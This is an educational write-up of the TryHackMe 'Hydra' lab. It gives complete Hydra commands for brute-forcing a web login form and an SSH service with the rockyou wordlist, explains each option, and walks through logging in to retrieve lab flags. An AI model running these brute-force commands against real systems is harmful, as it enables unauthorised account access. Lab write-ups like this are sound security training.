# 🚀 TryHackMe - Hydra Writeup

<img width="1093" height="194" alt="1 lab" src="https://github.com/user-attachments/assets/4125e474-0b38-4394-bfea-30d8fc64aedd" />

## 📌 Room Information

| Category | Details |
|----------|----------|
| 🏷️ Room Name | Hydra |
| 🌐 Platform | TryHackMe |
| ⚡ Difficulty | Easy |
| 🎯 Focus | Hydra Basics / Brute Forcing |
| 🛠️ Tools Used | Hydra, SSH, Browser DevTools |

---

# 🧠 Overview

This room is a beginner-friendly introduction to using **Hydra** for brute-force attacks against web logins and SSH services.

In this lab, we learned:

- 🔍 How Hydra works
- 🌐 How to analyze a web login request
- 🔓 How to brute-force HTTP login forms
- 🖥️ How to brute-force SSH credentials
- ⚙️ Basic Hydra syntax and important flags

---

# 🌐 Task 1 - Initial Enumeration

The first step was to open the target IP provided by the room in the browser.

We navigated to:

```bash
http://Target-IP/login
```

A login page appeared asking for a username and password.

---

# 🔍 Analyzing the Login Request

Before using Hydra, we needed to understand how the login form sends credentials.

## 🪜 Steps

1. Open Browser Developer Tools (`F12`)
2. Go to the **Network** tab
3. Enter random credentials in the login form
4. Click the login button
5. Inspect the POST request

We found the following POST parameters in Request tab:

```bash
username=user&password=<pass>
```

<img width="1599" height="651" alt="2 web" src="https://github.com/user-attachments/assets/c7944706-29f1-4662-8e78-6899a06080d4" />

We also observed the failure message returned by the application in Response tab:

```bash
Your username or password is incorrect.
```

This information is important because Hydra needs:

- ✅ The POST request format
- ✅ The failure response message

---

# 🚩 Question 1

## ❓ Use Hydra to brute-force molly's web password. What is the value of flag 1?

---

# ⚔️ Brute-Forcing the Web Login

We used the following Hydra command:

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt Target-IP http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V -t 4 -f
```

---

# 🧩 Command Breakdown

| Option | Explanation |
|--------|-------------|
| `hydra` | Launches Hydra |
| `-l molly` | Specifies the username |
| `-P /usr/share/wordlists/rockyou.txt` | Uses the rockyou wordlist for passwords |
| `Target-IP` | Target machine IP |
| `http-post-form` | Attack type for HTTP POST forms |
| `/login` | Login endpoint |
| `username=^USER^&password=^PASS^` | POST request parameters |
| `F=Your username or password is incorrect.` | Failure message detection |
| `-V` | Verbose mode (shows attempts) |
| `-t 4` | Uses 4 parallel threads |
| `-f` | Stops after finding valid credentials |

---

# ✅ Successful Login

After some time, Hydra successfully discovered the password for the user `molly`.

Hydra output looked similar to:

```bash
[80][http-post-form] host: Target-IP   login: molly   password: <PASSWORD>
```

We then logged into the website using the discovered credentials.

After logging in successfully, we obtained **Flag 1** 🎉

<img width="1599" height="706" alt="4 flag1" src="https://github.com/user-attachments/assets/ce37ed3d-53d4-4d2c-952b-44e575206fe0" />

---

# 🚩 Question 2

## ❓ Use Hydra to brute-force molly's SSH password. What is the value of flag 2?

---

# 🖥️ Brute-Forcing SSH

Next, we attacked the SSH service using Hydra.

## ⚔️ Command Used

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://Target-IP -V -t 4 -f
```

---

# 🧩 SSH Command Breakdown

| Option | Explanation |
|--------|-------------|
| `-l molly` | Username to attack |
| `-P rockyou.txt` | Password wordlist |
| `ssh://Target-IP` | SSH target service |
| `-V` | Verbose output |
| `-t 4` | 4 concurrent threads |
| `-f` | Stop after success |

---

# 🔓 SSH Access

Hydra successfully found the SSH password for `molly`.

We then connected to the machine using SSH:

```bash
ssh molly@Target-IP
```

After entering the discovered password, we gained shell access to the target machine.

---

# 🚩 Finding Flag 2

Inside the SSH session, we found a file named:

```bash
flag2.txt
```

We displayed its contents using:

```bash
cat flag2.txt
```

This revealed **Flag 2** 🎉

<img width="675" height="130" alt="6 flag2" src="https://github.com/user-attachments/assets/c3776270-d719-41e9-8d48-a52866fa9d61" />

---

# 🏁 Conclusion

This room provided a solid introduction to Hydra and brute-force attacks.

## 🧠 Key Takeaways

- 🔍 Analyze login requests before attacking
- 🌐 Understand how HTTP POST forms work
- ⚔️ Use Hydra against web forms and SSH services
- 🛠️ Learn Hydra syntax and important flags
- 🚨 Understand the importance of strong passwords

---

# 🛡️ Disclaimer

This writeup is for educational purposes only and was performed in a legal lab environment provided by TryHackMe.

---
